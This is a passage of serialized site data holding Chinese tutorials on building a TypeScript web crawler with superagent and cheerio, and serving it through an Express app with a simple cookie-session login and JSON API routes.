this.startCrawler();\n    }\n    /**\n     * @description 总控制\n     */\n    private async startCrawler() {\n        // 获取网站静态html内容\n        const html: string = await this.getSourHtml();\n        // 分析器分析\n        const jsonData: string = this._analyzer.analysis(html, this._filePath);\n        // 将json数据写入文件\n        this.writeFile(jsonData);\n    }\n    /**\n     * @description 获取网站静态html内容\n     * @returns html内容，隐式转换为Promise了\n     */\n    private async getSourHtml(): Promise<string> {\n        const response: superagent.Response = await superagent.get(this._url);\n        return response.text;\n    }\n    /**\n     * @description 将json数据写入文件\n     */\n    private writeFile(jsonData: string) {\n        fs.writeFileSync(this._filePath, jsonData);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n\nbookAnalyzer.ts\n\nimport cheerio from 'cheerio';\nimport { IAnalyzer } from './crawler';\nimport { unescapeCode } from '../utils/escapeCode';\n\n// 汇总信息\ninterface IrankInfo {\n    name: string;       // 名字or标题\n    list: Irank[]       // 具体内容\n}\ninterface Irank {\n    name: string;       // 名字or标题\n    list: Ibook[]       // 具体内容\n}\n// 小说信息\ninterface Ibook {\n    num: string;\n    bookName: string;\n    bookCount: string;\n}\n\nexport default class BookAnalyzer implements IAnalyzer {\n    // 单例模式\n    private static _instance: BookAnalyzer;\n    public static get I(): BookAnalyzer {\n        return this._instance ? this._instance : (this._instance = new BookAnalyzer());\n    }\n    private _$: cheerio.Root = null;\n    private constructor() { }\n    public analysis(html: string, filePath: string): string {\n        // 对html内容进行处理\n        const rankInfo: IrankInfo = this.getRankInfo(html);\n        // 将处理后的信息转为json数据\n        return this.generateJsonData(rankInfo, filePath);\n    }\n    /**\n     * @description 对html内容进行处理\n     * @returns html内容，隐式转换为Promise了\n     */\n    private getRankInfo(html: string): IrankInfo {\n        // 将html字符串用cheerio转为dom元素\n        this._$ = cheerio.load(html);\n        // 文章信息在id为allupdate的ul里\n        const rankHtml: cheerio.Cheerio = this._$('.rank_main');\n        // console.log('rankHtml', rankHtml.html());\n        // 最后要返回的值\n        const rankInfo: IrankInfo = { name: '', list: new Array<Irank>() };\n        // 标题\n        const nameHtml = this._$(rankHtml).find('.rank_banner .rank_i_title_name')?.children();\n        rankInfo.name = nameHtml ? nameHtml.text() : '人气排行榜';\n        // 榜单清单\n        const listHtml = this._$(rankHtml).find('.rank_i_lists .rank_i_p_list');\n        listHtml.map((index, value) => {\n            if ([0, 2, 4, 5].includes(index)) { // 只收取有点击数的，其他的暂时不作处理\n                const name: string = unescapeCode(this._$(value).find('.rank_i_p_tit').text());\n                const list: Ibook[] = this.handleBookInfo(this._$(value).find('.rank_i_li'));\n                rankInfo.list.push({ name, list });\n            }\n        });\n        return rankInfo;\n    }\n    private handleBookInfo(obj: cheerio.Cheerio): Ibook[] {\n        const bookArr: Ibook[] = [];\n        obj.map((index, value) => {\n            let num = '';\n            let bookName = '';\n            let bookCount = '';\n            if (index === 0) {\n                const data = this._$(value).children();\n                num = unescapeCode(data.eq(0).text());\n                bookName = unescapeCode(data.eq(1).children().eq(0).text());\n                bookCount = unescapeCode(data.eq(1).children().eq(3).text());\n                bookCount = bookCount.replace(/[^0-9]/ig, ''); // 将非数字去掉\n            } else {\n                const data = this._$(value).children();\n                num = unescapeCode(data.eq(0).text());\n                bookName = unescapeCode(data.eq(1).children().eq(0).text());\n                bookCount = unescapeCode(data.eq(2).text());\n            }\n            bookArr.push({ num, bookName, bookCount });\n        });\n        return bookArr;\n    }\n    /**\n     * @description 将处理后的文章信息转为json数据\n     * @returns 处理后的信息\n     */\n    private generateJsonData(rankInfo: IrankInfo, filePath: string): string {\n        let fileContent: IrankInfo = null;\n        /* if (fs.existsSync(filePath)) {\n            // 旧数据：从旧文件中读取的是json字符串，转成json\n            fileContent = JSON.parse(fs.readFileSync(filePath, 'utf-8'));\n        } */\n        // 构造新数据，返回记得转成json字符串。其实旧数据被覆盖了，其实也不需要旧数据\n        fileContent = rankInfo;\n\n        return JSON.stringify(fileContent);\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n\n\n\n# 编译运行\n\n * 使用的是ts，最原始的就是先编译后运行，tsc和node src/crawler.js；编译输出路径设置在tsconfig.json，新添outDir:\"./dist\"；\n * 如果使用ts-node会更方便一点，npm install ts-node -g，局部安装也可以；然后运行ts-node src/crawler.ts；\n * 如果能监听ts的变化然后自动编译成js就好了，使用tsc -w，再打开package.json，在scripts里添加\"build\": \"tsc -w\"；\n * 如果还能自动运行js就好了，npm install nodemon -D，打开package.json，在scripts里添加\"start\": \"nodemon node ./dist/crawler.js\"；\n * 但运行程序会生成爬虫数据，这样nodemon认为文件又编译了就又会运行一遍并无限循环下去，所以让nodemon忽略生成的数据，打开package.json，添加\"nodemonConfig\":{\"ignore\":[\"data/*\"]}；\n * 如果又能自动编译又能自动运行就更好了，可以开两个命令行分别运行上面两条命令；也可以使用concurrently；\n * npm install concurrently -D，打开package.json，将scripts里的\"build\"修改为\"dev:build\"而\"start\"修改为\"dev:start\"，并在scripts里新添加命令concurrently npm:dev:*，意思是使用concurrently来运行所有\"dev:*\"写法的npm命令。",normalizedContent:"# 用ts编写小爬虫\n\n\n# 初始化项目\n\n创建package.json和tsconfig.json，便捷的命令是npm init -y和tsc --init，当然你也可以手动创建手动添加配置项。\n\n\n# 使用superagent\n\nsuperagent是一个请求代理模块，可以使用它在node环境中发送ajax请求。\n\n先安装它，npm install superagent --save，然后再安装它的.d.ts类型声明文件，npm install @types/superagent --d。\n\n我们主要使用它的superagent.get方法，会去请求链接，然后返回我们要爬取的内容。\n\nprivate async getsourhtml(): promise<string> {\n    const response: superagent.response = await superagent.get(this._url);\n    return response.text;\n}\n\n\n1\n2\n3\n4\n\n\n\n# 使用cheerio\n\n我们需要对爬取到的html内容进行分析提取，可以通过cheerio来获取html内容里的模块组成。\n\nprivate getrankinfo(html: string): irankinfo {\n    // 将html字符串用cheerio转为dom元素\n    this._$ = cheerio.load(html);\n    // 文章信息在id为allupdate的ul里\n    const rankhtml: cheerio.cheerio = this._$('.rank_main');\n    // console.log('rankhtml', rankhtml.html());\n    // 最后要返回的值\n    const rankinfo: irankinfo = { name: '', list: new array<irank>() };\n    // 标题\n    const namehtml = this._$(rankhtml).find('.rank_banner .rank_i_title_name')?.children();\n    rankinfo.name = namehtml ? namehtml.text() : '人气排行榜';\n    // 榜单清单\n    const listhtml = this._$(rankhtml).find('.rank_i_lists .rank_i_p_list');\n    listhtml.map((index, value) => {\n        if ([0, 2, 4, 5].includes(index)) { // 只收取有点击数的，其他的暂时不作处理\n            const name: string = unescapecode(this._$(value).find('.rank_i_p_tit').text());\n            const list: ibook[] = this.handlebookinfo(this._$(value).find('.rank_i_li'));\n            rankinfo.list.push({ name, list });\n        }\n    });\n    return rankinfo;\n}\nprivate handlebookinfo(obj: cheerio.cheerio): ibook[] {\n    const bookarr: ibook[] = [];\n    obj.map((index, value) => {\n        let num = '';\n        let bookname = '';\n        let bookcount = '';\n        if (index === 0) {\n            const data = this._$(value).children();\n            num = unescapecode(data.eq(0).text());\n            bookname = unescapecode(data.eq(1).children().eq(0).text());\n            bookcount = unescapecode(data.eq(1).children().eq(3).text());\n            bookcount = bookcount.replace(/[^0-9]/ig, ''); // 将非数字去掉\n        } else {\n            const data = this._$(value).children();\n            num = unescapecode(data.eq(0).text());\n            bookname = unescapecode(data.eq(1).children().eq(0).text());\n            bookcount = unescapecode(data.eq(2).text());\n        }\n        bookarr.push({ num, bookname, bookcount });\n    });\n    return bookarr;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n\n\n\n# 使用node自带的fs处理文件\n\n首先是读取旧文件里的东西：fs.readfilesync(filepath, 'utf-8')，并将它转成json对象，再将新内容添加到json对象里，最后又将json对象转为json字符串。后面由于更改了需求，没有必要追加到以前的数据上，直接使用新数据。\n\nprivate generatejsondata(rankinfo: irankinfo, filepath: string): string {\n    let filecontent: irankinfo = null;\n    /* if (fs.existssync(filepath)) {\n        // 旧数据：从旧文件中读取的是json字符串，转成json\n        filecontent = json.parse(fs.readfilesync(filepath, 'utf-8'));\n    } */\n    // 构造新数据，返回记得转成json字符串。其实旧数据被覆盖了，其实也不需要旧数据\n    filecontent = rankinfo;\n\n    return json.stringify(filecontent);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n有了json字符串后，需要重新将它写入文件\n\nprivate writefile(jsondata: string) {\n    fs.writefilesync(this._filepath, jsondata);\n}\n\n\n1\n2\n3\n\n\n\n# 模式优化\n\n使用组合模式将分析html那块单独抽离，并且抽象出一个顶级的“分析器”，我们需要什么样的分析器再实现什么样的分析器。\n\n使用单例模式来用分析器，在全局中只要有分析器的一个实例就可以了，只需调用单例的公共方法。\n\n\n# 爬虫代码清单\n\ncrawler.ts\n\nimport fs from 'fs';\nimport path from 'path';\nimport superagent from 'superagent';\n\nexport interface ianalyzer {\n    analysis: (html: string, filepath: string) => string\n}\n\n/**\n * @description 使用ts写一个爬虫(优化crawler1.ts)\n * @author liawnliu\n * @version 1.0.0\n */\nexport default class crawler {\n    private _filepath: string = path.resolve(__dirname, '../../data/book.json');\n    constructor(private _url: string, private _analyzer: ianalyzer) {\n        // 开始爬取\n        this.startcrawler();\n    }\n    /**\n     * @description 总控制\n     */\n    private async startcrawler() {\n        // 获取网站静态html内容\n        const html: string = await this.getsourhtml();\n        // 分析器分析\n        const jsondata: string = this._analyzer.analysis(html, this._filepath);\n        // 将json数据写入文件\n        this.writefile(jsondata);\n    }\n    /**\n     * @description 获取网站静态html内容\n     * @returns html内容，隐式转换为promise了\n     */\n    private async getsourhtml(): promise<string> {\n        const response: superagent.response = await superagent.get(this._url);\n        return response.text;\n    }\n    /**\n     * @description 将json数据写入文件\n     */\n    private writefile(jsondata: string) {\n        fs.writefilesync(this._filepath, jsondata);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n\nbookanalyzer.ts\n\nimport cheerio from 'cheerio';\nimport { ianalyzer } from './crawler';\nimport { unescapecode } from '../utils/escapecode';\n\n// 汇总信息\ninterface irankinfo {\n    name: string;       // 名字or标题\n    list: irank[]       // 具体内容\n}\ninterface irank {\n    name: string;       // 名字or标题\n    list: ibook[]       // 具体内容\n}\n// 小说信息\ninterface ibook {\n    num: string;\n    bookname: string;\n    bookcount: string;\n}\n\nexport default class bookanalyzer implements ianalyzer {\n    // 单例模式\n    private static _instance: bookanalyzer;\n    public static get i(): bookanalyzer {\n        return this._instance ? this._instance : (this._instance = new bookanalyzer());\n    }\n    private _$: cheerio.root = null;\n    private constructor() { }\n    public analysis(html: string, filepath: string): string {\n        // 对html内容进行处理\n        const rankinfo: irankinfo = this.getrankinfo(html);\n        // 将处理后的信息转为json数据\n        return this.generatejsondata(rankinfo, filepath);\n    }\n    /**\n     * @description 对html内容进行处理\n     * @returns html内容，隐式转换为promise了\n     */\n    private getrankinfo(html: string): irankinfo {\n        // 将html字符串用cheerio转为dom元素\n        this._$ = cheerio.load(html);\n        // 文章信息在id为allupdate的ul里\n        const rankhtml: cheerio.cheerio = this._$('.rank_main');\n        // console.log('rankhtml', rankhtml.html());\n        // 最后要返回的值\n        const rankinfo: irankinfo = { name: '', list: new array<irank>() };\n        // 标题\n        const namehtml = this._$(rankhtml).find('.rank_banner .rank_i_title_name')?.children();\n        rankinfo.name = namehtml ? namehtml.text() : '人气排行榜';\n        // 榜单清单\n        const listhtml = this._$(rankhtml).find('.rank_i_lists .rank_i_p_list');\n        listhtml.map((index, value) => {\n            if ([0, 2, 4, 5].includes(index)) { // 只收取有点击数的，其他的暂时不作处理\n                const name: string = unescapecode(this._$(value).find('.rank_i_p_tit').text());\n                const list: ibook[] = this.handlebookinfo(this._$(value).find('.rank_i_li'));\n                rankinfo.list.push({ name, list });\n            }\n        });\n        return rankinfo;\n    }\n    private handlebookinfo(obj: cheerio.cheerio): ibook[] {\n        const bookarr: ibook[] = [];\n        obj.map((index, value) => {\n            let num = '';\n            let bookname = '';\n            let bookcount = '';\n            if (index === 0) {\n                const data = this._$(value).children();\n                num = unescapecode(data.eq(0).text());\n                bookname = unescapecode(data.eq(1).children().eq(0).text());\n                bookcount = unescapecode(data.eq(1).children().eq(3).text());\n                bookcount = bookcount.replace(/[^0-9]/ig, ''); // 将非数字去掉\n            } else {\n                const data = this._$(value).children();\n                num = unescapecode(data.eq(0).text());\n                bookname = unescapecode(data.eq(1).children().eq(0).text());\n                bookcount = unescapecode(data.eq(2).text());\n            }\n            bookarr.push({ num, bookname, bookcount });\n        });\n        return bookarr;\n    }\n    /**\n     * @description 将处理后的文章信息转为json数据\n     * @returns 处理后的信息\n     */\n    private generatejsondata(rankinfo: irankinfo, filepath: string): string {\n        let filecontent: irankinfo = null;\n        /* if (fs.existssync(filepath)) {\n            // 旧数据：从旧文件中读取的是json字符串，转成json\n            filecontent = json.parse(fs.readfilesync(filepath, 'utf-8'));\n        } */\n        // 构造新数据，返回记得转成json字符串。其实旧数据被覆盖了，其实也不需要旧数据\n        filecontent = rankinfo;\n\n        return json.stringify(filecontent);\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n\n\n\n# 编译运行\n\n * 使用的是ts，最原始的就是先编译后运行，tsc和node src/crawler.js；编译输出路径设置在tsconfig.json，新添outdir:\"./dist\"；\n * 如果使用ts-node会更方便一点，npm install ts-node -g，局部安装也可以；然后运行ts-node src/crawler.ts；\n * 如果能监听ts的变化然后自动编译成js就好了，使用tsc -w，再打开package.json，在scripts里添加\"build\": \"tsc -w\"；\n * 如果还能自动运行js就好了，npm install nodemon -d，打开package.json，在scripts里添加\"start\": \"nodemon node ./dist/crawler.js\"；\n * 但运行程序会生成爬虫数据，这样nodemon认为文件又编译了就又会运行一遍并无限循环下去，所以让nodemon忽略生成的数据，打开package.json，添加\"nodemonconfig\":{\"ignore\":[\"data/*\"]}；\n * 如果又能自动编译又能自动运行就更好了，可以开两个命令行分别运行上面两条命令；也可以使用concurrently；\n * npm install concurrently -d，打开package.json，将scripts里的\"build\"修改为\"dev:build\"而\"start\"修改为\"dev:start\"，并在scripts里新添加命令concurrently npm:dev:*，意思是使用concurrently来运行所有\"dev:*\"写法的npm命令。",charsets:{cjk:!0}},{title:"2.用express支撑小爬虫",frontmatter:{title:"2.用express支撑小爬虫"},regularPath:"/book-web/%E9%A1%B9%E7%9B%AE/react+express+ts%E5%86%99%E7%88%AC%E8%99%AB/2.%E7%94%A8express%E5%AE%9E%E7%8E%B0%E7%88%AC%E8%99%AB%E6%8E%A5%E5%8F%A3.html",relativePath:"book-web/项目/react+express+ts写爬虫/2.用express实现爬虫接口.md",key:"v-44238a46",path:"/book-web/%E9%A1%B9%E7%9B%AE/react+express+ts%E5%86%99%E7%88%AC%E8%99%AB/2.%E7%94%A8express%E5%AE%9E%E7%8E%B0%E7%88%AC%E8%99%AB%E6%8E%A5%E5%8F%A3.html",headers:[{level:2,title:"安装使用express",slug:"安装使用express",normalizedTitle:"安装使用express",charIndex:20},{level:2,title:"定义路由项",slug:"定义路由项",normalizedTitle:"定义路由项",charIndex:521},{level:2,title:"拿取爬虫数据",slug:"拿取爬虫数据",normalizedTitle:"拿取爬虫数据",charIndex:1152},{level:2,title:"扩展express的类型定义",slug:"扩展express的类型定义",normalizedTitle:"扩展express的类型定义",charIndex:2309},{level:2,title:"状态持久化",slug:"状态持久化",normalizedTitle:"状态持久化",charIndex:2889},{level:3,title:"使用cookie-session中间件",slug:"使用cookie-session中间件",normalizedTitle:"使用cookie-session中间件",charIndex:2899},{level:3,title:"登陆登出",slug:"登陆登出",normalizedTitle:"登陆登出",charIndex:3619},{level:2,title:"接口化",slug:"接口化",normalizedTitle:"接口化",charIndex:7963},{level:2,title:"使用装饰器来优化",slug:"使用装饰器来优化",normalizedTitle:"使用装饰器来优化",charIndex:11630},{level:2,title:"优化后的代码清单",slug:"优化后的代码清单",normalizedTitle:"优化后的代码清单",charIndex:12715}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"安装使用express 定义路由项 拿取爬虫数据 扩展express的类型定义 状态持久化 使用cookie-session中间件 登陆登出 接口化 使用装饰器来优化 优化后的代码清单",content:"# 用express支撑小爬虫\n\n\n# 安装使用express\n\nexpress是一个基于node的web后端框架，特点是极简灵活，提供精简的基本Web应用程序功能。也是第一代node后端框架，也是目前使用率第一的框架，有很多框架还有程序是基于它的。\n\n局部安装express和它的类型声明文件：npm install express --save，npm install @types/express --save\n\n编写index.ts，代码如下，使用ts-node运行它，在\"http://localhost:7001/\"里就能看到打印的“Hello”\n\nimport express from 'express';\n// 创建一个新的应用程序\nconst app = express();\n// 定义路由，发送内容\napp.get('/', (req, res) => {\n    res.send('Hello');\n});\n// 绑定并监听连接\napp.listen(7001, () => {\n    console.log('start serve');\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 定义路由项\n\n像上面这个简单例子里使用了app.get定义了一个路由，如果使用多个呢？可以使用express中的Router来定义，并且可以单独抽到一个ts文件里书写。\n\nrouter.ts\n\nimport { Router, Request, Response } from 'express';\n\nconst router = Router();\nrouter.get('/', (req: Request, res: Response) => {\n    res.send('Hello');\n});\nrouter.get('/data', (req: Request, res: Response) => {\n    res.send('Hello Data');\n});\nexport default router;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\nindex.ts\n\nimport express from 'express';\nimport router from './router'\n\n// 创建一个新的应用程序\nconst app = express();\n// 使用之前定义的路由\napp.use(router);\n// 绑定并监听连接\napp.listen(7001, () => {\n    console.log('start serve');\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 拿取爬虫数据\n\n将之前写的爬虫相关的类Crawler、BookAnalyzer导进来，在/data路由下再去爬取新数据。但是要给访问/data路由进行限制，拥有权限的才允许访问。可以使用post请求传递密码，然后对路由的request的body进行校验。\n\n但是校验过程中，request的body解析会有问题，我们需要借助一个中间件，npm install body-parser --save，安装完后在index.ts导入它，并在使用路由前加上这一行代码app.use(bodyParser.urlencoded({ extended: false }))。接着完善我们的router.ts：\n\nimport { Router, Request, Response } from 'express';\nimport Crawler from './crawler';\nimport BookAnalyzer from './bookAnalyzer';\n\nconst router = Router();\n\nrouter.get('/', (req: Request, res: Response) => {\n    res.send(`<html>\n                <body><form method=\"post\" action=\"/data\">\n                    <input type=\"password\" name=\"password\" />\n                    <button>提交</button>\n                </form></body>\n            </html>`);\n});\n// 对应前端的post请求\nrouter.post('/data', (req: Request, res: Response) => {\n    if (req.body.password === '123') {\n        const url = 'http://top.hengyan.com/haokan/';\n        const crawler: Crawler = new Crawler(url, BookAnalyzer.I);\n        res.send('爬取数据成功!');\n    } else {\n        res.send('密码错误！');\n    }\n});\n\nexport default router;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n\n# 扩展express的类型定义\n\n虽然express有类型定义文件，但会有些瑕疵，比如Request和Response的body在express里是any，这不太符合规范。解决方案就是使用interface约束一个新类型，并且这个新类型去继承老类型，然后在使用时就使用这个新类型。\n\ninterface InewRequest extends Request {\n    body: {\n        [key: string]: string | undefined;\n    };\n};\n\n\n1\n2\n3\n4\n5\n\n\n还有就是使用中间件的话，特别是使用自定义中间件，难免会遇到在Request新添加属性。可以将express原有的类型定义和自己写的类型定义融合，这里要明确一点：是融合不是覆盖以前的。像上面使用inteface配合extends是使用新类型名，类型定义融合虽然使用老的类型名，但也只是扩充了老类型的属性而已。\n\ndeclare namespace Express { // 这里要跟原来的*.d.ts里的一样\n    interface Request { // 这里要跟原来的*.d.ts里的一样\n        xxx: string; // 而这里就是新添的属性，后面就会类型定义融合\n    }\n}\n\n\n1\n2\n3\n4\n5\n\n\n\n# 状态持久化\n\n\n# 使用cookie-session中间件\n\n登陆的状态需要持久化，可以使用中间件npm install cookie-session --save，它有自己的类型定义npm install @types/cookie-session -D。\n\n加上使用中间件的代码：\n\nimport express from 'express';\nimport cookieSession from 'cookie-session';\nimport bodyParser from 'body-parser'\nimport router from './router'\n\n// 创建一个新的应用程序\nconst app = express();\n\n// 使用cookie-session中间件\napp.use(cookieSession({\n    name: 'session',\n    keys: ['login'],\n    // Cookie Options\n    maxAge: 24 * 60 * 60 * 1000 // 24 hours\n}))\n//使用中间件来解析form表单请求里的body\napp.use(bodyParser.urlencoded({ extended: false }));\n// 使用路由\napp.use(router);\n\n// 绑定并监听连接\napp.listen(7001, () => {\n    console.log('start serve');\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n\n# 登陆登出\n\n最主要的就在于登陆状态的判断，req.session上一小节里的中间件，登陆成功后给session里塞一个login属性，在下次访问对应路由时会校验它。\n\n我们还添加了一个中间页面，里面有“查看数据”、“爬取数据”、“退出登陆”这三个功能性按钮，对应也给他们设置了路由。\n\nimport { Router, Request, Response } from 'express';\nimport Crawler from './crawler/crawler';\nimport BookAnalyzer from './crawler/bookAnalyzer';\nimport fs from 'fs';\nimport path from 'path';\n\ninterface ExpRequest extends Request {\n    body: {\n        [key: string]: string | undefined;\n    }\n}\n\nconst router = Router();\n\n// 登陆状态\nconst checkLogin = (req: ExpRequest, res: Response) => {\n    if (!req.session || !req.session.login) {\n        res.send(\n            `<html>\n                <body>\n                    您还没有登陆！请先<a href=\"/\">登陆！</a>\n                </body>\n            </html>`);\n        return false;\n    }\n    return true;\n}\n// 主页\nrouter.get('/', (req: ExpRequest, res: Response) => {\n    if (req.session && req.session.login) {\n        // 登陆过了\n        res.send(\n            `<html>\n                <body>\n                    <a href=\"/show\">查看数据</a>\n                    <a href=\"/data\">爬取数据</a>\n                    <a href=\"/logout\">退出登陆</a>\n                </body>\n            </html>`);\n    } else {\n        // 没有登陆显示登陆框\n        res.send(`\n            <html>\n                <body>\n                    <form method=\"post\" action=\"/login\">\n                        <input type=\"password\" name=\"password\" />\n                        <button>登陆</button>\n                    </form>\n                </body>\n            </html>\n        `);\n    }\n});\n// 登陆校验\nrouter.post('/login', (req: ExpRequest, res: Response) => {\n    if (req.session && req.session.login) {\n        // 之前登陆过了，重定向到中转站\n        res.redirect('/');\n    } else {\n        const { password } = req.body;\n        if (password === '123') {\n            // 登陆状态更新\n            req.session.login = true;\n            // 重定向到中转站\n            res.redirect('/');\n        } else {\n            res.send(\n                `<html>\n                    <body>\n                        密码错误！请重新<a href=\"/\">登陆！</a><br/>\n                    </body>\n                </html>`);\n        }\n    }\n});\n// 以get的方式访问登陆校验\nrouter.get('/login', (req: ExpRequest, res: Response) => {\n    if (checkLogin(req, res)) {\n        // 之前登陆过了，重定向到中转站\n        res.redirect('/');\n    }\n});\n// 登出操作\nrouter.get('/logout', (req: ExpRequest, res: Response) => {\n    if (req.session && req.session.login) {\n        req.session.login = undefined;\n        res.send(\n            `<html>\n                <body>\n                    登出成功！需要再<a href=\"/\">登陆</a>吗？\n                </body>\n            </html>`);\n    } else {\n        res.send(\n            `<html>\n                <body>\n                    您本来就是未登录状态！请问需要<a href=\"/\">登陆</a>吗？\n                </body>\n            </html>`);\n    }\n});\n// 展示爬虫数据\nrouter.get('/show', (req: ExpRequest, res: Response) => {\n    if (checkLogin(req, res)) {\n        try {\n            const filePath = path.resolve(__dirname, '../data/book.json');\n            const jsonStr = fs.readFileSync(filePath, 'utf-8');\n            res.send(JSON.parse(jsonStr));\n        } catch (error) {\n            res.send(\n                `<html>\n                    <body>\n                        展示数据出错！<a href=\"/\">返回</a><br/>\n                        ${error}\n                    </body>\n                </html>`);\n        }\n    }\n});\n// 爬一次数据\nrouter.get('/data', (req: ExpRequest, res: Response) => {\n    if (checkLogin(req, res)) {\n        try {\n            const url = 'http://top.hengyan.com/haokan/';\n            const crawler: Crawler = new Crawler(url, BookAnalyzer.I);\n            res.send(\n                `<html>\n                    <body>\n                        爬取成功！<br/>\n                        <a href=\"/show\">查看全部数据</a>\n                    </body>\n                </html>`);\n        } catch (error) {\n            res.send(\n                `爬取出错！`);\n        }\n    }\n});\n\nexport default router;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n\n\n\n# 接口化\n\n减少res.send给前端发送html元素，将其换成res.jsonn，也就是以接口的形式返回给前端，前端根据接口再去写html。\n\ngetResponse.ts\n\ninterface Iresult {\n    success: boolean;\n    errMsg?: string;\n    data: Object;\n};\nexport const getResponse = (data: Object, errMsg?: string): Iresult => {\n    return { success: errMsg == null, errMsg, data }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nrouter.ts\n\nimport { Router, Request, Response } from 'express';\nimport Crawler from './crawler/crawler';\nimport BookAnalyzer from './crawler/bookAnalyzer';\nimport fs from 'fs';\nimport path from 'path';\nimport { getResponse } from './utils/getResponse';\n\ninterface ExpRequest extends Request {\n    body: {\n        [key: string]: string | undefined;\n    }\n}\n\nconst router = Router();\n\n// 登陆状态\nconst checkLogin = (req: ExpRequest, res: Response) => {\n    if (!req.session || !req.session.login) {\n        res.json(getResponse(false, '您还没有登陆！请先登陆！'));\n        return false;\n    }\n    return true;\n}\n// 主页\nrouter.get('/', (req: ExpRequest, res: Response) => {\n    if (req.session && req.session.login) {\n        // 登陆过了\n        res.send(\n            `<html>\n                <body>\n                    <a href=\"/show\">查看数据</a>\n                    <a href=\"/data\">爬取数据</a>\n                    <a href=\"/logout\">退出登陆</a>\n                </body>\n            </html>`);\n    } else {\n        // 没有登陆显示登陆框\n        res.send(`\n            <html>\n                <body>\n                    <form method=\"post\" action=\"/login\">\n                        <input type=\"password\" name=\"password\" />\n                        <button>登陆</button>\n                    </form>\n                </body>\n            </html>\n        `);\n    }\n});\n// 登陆校验\nrouter.post('/login', (req: ExpRequest, res: Response) => {\n    if (req.session && req.session.login) {\n        // 之前登陆过了，重定向到中转站\n        res.redirect('/');\n    } else {\n        const { password } = req.body;\n        if (password === '123') {\n            // 登陆状态更新\n            req.session.login = true;\n            // 重定向到中转站\n            res.redirect('/');\n        } else {\n            res.json(getResponse(false, '密码错误！'));\n        }\n    }\n});\n// 以get的方式访问登陆校验\nrouter.get('/login', (req: ExpRequest, res: Response) => {\n    if (checkLogin(req, res)) {\n        // 之前登陆过了，重定向到中转站\n        res.redirect('/');\n    }\n});\n// 登出操作\nrouter.get('/logout', (req: ExpRequest, res: Response) => {\n    if (req.session && req.session.login) {\n        req.session.login = undefined;\n        res.json(getResponse(true));\n    } else {\n        res.json(getResponse(false, '您本来就是未登录状态！'));\n    }\n});\n// 展示爬虫数据\nrouter.get('/show', (req: ExpRequest, res: Response) => {\n    if (checkLogin(req, res)) {\n        try {\n            const filePath = path.resolve(__dirname, '../data/book.json');\n            const jsonStr = fs.readFileSync(filePath, 'utf-8');\n            res.json(getResponse(JSON.parse(jsonStr)));\n        } catch (error) {\n            res.json(getResponse(error, '展示数据出错！'));\n        }\n    }\n});\n// 爬一次数据\nrouter.get('/data', (req: ExpRequest, res: Response) => {\n    if (checkLogin(req, res)) {\n        try {\n            const url = 'http://top.hengyan.com/haokan/';\n            const crawler: Crawler = new Crawler(url, BookAnalyzer.I);\n            res.json(getResponse(true));\n   